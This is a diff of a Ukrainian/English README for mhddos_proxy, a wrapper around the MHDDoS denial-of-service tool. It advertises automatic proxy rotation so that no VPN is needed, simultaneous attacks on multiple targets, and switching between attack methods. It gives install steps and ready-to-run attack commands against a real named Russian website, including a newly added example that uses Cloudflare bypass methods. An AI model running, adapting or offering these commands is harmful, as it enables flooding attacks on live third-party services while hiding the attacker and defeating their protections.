@@ -2,25 +2,21 @@
 
 Скрипт-обгортка для запуску потужного DDoS інструмента [MHDDoS](https://github.com/MHProDev/MHDDoS).
 
-- Не потребує VPN - автоматично скачує і підбирає робочі проксі для заданих цілей, періодично їх оновлюючи
-- Підтримує атаку декількох цілей з автоматичним балансуванням навантаження
-- Використовує різні методи для атаки і змінює їх в процесі роботи
+- **Не потребує VPN** - автоматично скачує і підбирає робочі проксі для заданих цілей, періодично їх оновлюючи
+- Атака **декількох цілей** з автоматичним балансуванням навантаження
+- Використовує **різні методи для атаки** і змінює їх в процесі роботи
 - Простий та зрозумілий інтерфейс з іменованими параметрами
 
 ## Intro
 
 Wrapper script for running [MHDDoS](https://github.com/MHProDev/MHDDoS)
 
-- No VPN required - automatically downloads and selects working proxies for given targets
-- Support for multiple targets with automatic load-balancing
+- **No VPN required** - automatically downloads and selects working proxies for given targets
+- Support for **multiple targets** with automatic load-balancing
 - Uses multiple attack methods and switches between them
 - Simpler interface with named arguments
 
-## Setup | Налаштування
-
-### Docker
-
-    docker pull portholeascend/mhddos_proxy:latest
+## Setup | Встановлення
 
 ### Python
 
@@ -28,6 +24,17 @@ Wrapper script for running [MHDDoS](https://github.com/MHProDev/MHDDoS)
     cd mhddos_proxy
     git clone https://github.com/MHProDev/MHDDoS.git
     python3 -m pip install -r MHDDoS/requirements.txt
+
+### Docker
+
+Встановіть і запустіть Docker
+
+- Windows: https://docs.docker.com/desktop/windows/install/
+- Mac: https://docs.docker.com/desktop/mac/install/
+- Ubuntu: https://docs.docker.com/engine/install/ubuntu/
+
+
+    docker pull portholeascend/mhddos_proxy:latest
 
 ## Running | Запуск
 
@@ -103,9 +110,9 @@ Get more proxies (possibly lower quality)
 
     python3 runner.py --proxy-timeout 5 https://tvzvezda.ru
 
-Specific attack method
+Specific attack method(s) (two Cloudflare bypass methods in this case)
 
-    python3 runner.py https://tvzvezda.ru --http-methods GET
+    python3 runner.py https://tvzvezda.ru --http-methods CFB CFBUAM
 
 # TODO
 
